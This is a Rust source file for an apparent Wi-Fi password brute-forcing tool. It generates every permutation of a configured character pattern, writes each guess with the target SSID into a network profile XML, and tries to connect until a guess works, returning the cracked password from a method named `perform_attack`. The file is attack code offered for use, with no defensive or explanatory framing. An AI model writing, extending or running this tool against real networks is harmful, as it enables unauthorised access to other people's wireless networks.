extern crate permutohedron;

use network::ProfileNetwork;
use config::Config;
use handlers::NetworkXmlProfileHandler;
use std::io;
use file_writer::FileWriter;
use self::permutohedron::heap_recursive;

const OUTPUT_XML_FILE_PATH: &str = "output-1.xml";

// this profile.xml isn't needed currently, hence it's just a dummy variable...
const TEMPLATE_PROFILE_XML_PATH: &str = "profile.xml"; 

pub struct WifiBruteforcer<'a> {
  config: Config<'a>,
  profile_xml_path: &'a str,
  output_xml_path: &'a str,
  profile_network: ProfileNetwork<'a>,
  xml_handler: Option<NetworkXmlProfileHandler<'a>>,
}

impl<'a> WifiBruteforcer<'a> {
  pub fn new(config: Config<'a>) -> Result<Self, io::Error> {
    match ProfileNetwork::new(config.ssid) {
      Ok(network) => Ok(WifiBruteforcer {
        config,
        profile_xml_path: TEMPLATE_PROFILE_XML_PATH,
        output_xml_path: OUTPUT_XML_FILE_PATH,
        profile_network: network,
        xml_handler: None,
      }),
      Err(err) => Err(err),
    }
  }

  fn permutate_characters(&self, data: Vec<char>) -> Vec<String> {
    let mut data = data.to_owned();
    let mut permutations: Vec<String> = Vec::new();

    heap_recursive(&mut data, |p| {
      let w: String = p.to_vec().into_iter().collect();
      permutations.push(w);
    });

    permutations
  }

  fn generate_all_possible_password(&self) -> Vec<String> {
    let vals: Vec<char> = self.config.pattern_password.chars().collect();
    let possible_combinations = self.permutate_characters(vals);

    possible_combinations
  }

  fn bruteforce_network(&self) -> bool {
    self.profile_network.connect()
  }

  pub fn perform_attack(&mut self) -> Result<Option<String>, io::Error> {
    if self.xml_handler.is_none() {
      self.xml_handler = Some(NetworkXmlProfileHandler::new(self.profile_xml_path)?);
    }

    let original_xml_data = self.xml_handler.as_ref().unwrap().content.clone().unwrap(); // is safe to unwrap because of handling above

    // Generate password combination
    let trial_passwords = self.generate_all_possible_password();

    for password in trial_passwords.iter() {
      // Clone data
      let mut temp_data = String::new();
      original_xml_data.clone_into(&mut temp_data);

      // Replace SSID and password
      let mut temp_data = temp_data.replace("{SSID}", self.config.ssid);
      let temp_data = temp_data.replace("{password}", password);
      FileWriter::write(self.output_xml_path, &temp_data)?;

      // Write details to new xml file
      self
        .xml_handler
        .as_mut()
        .unwrap()
        .to_file(self.output_xml_path)?;

      if self.bruteforce_network() {
        return Ok(Some(password.to_string()));
      }
    }

    Ok(None)
  }
}
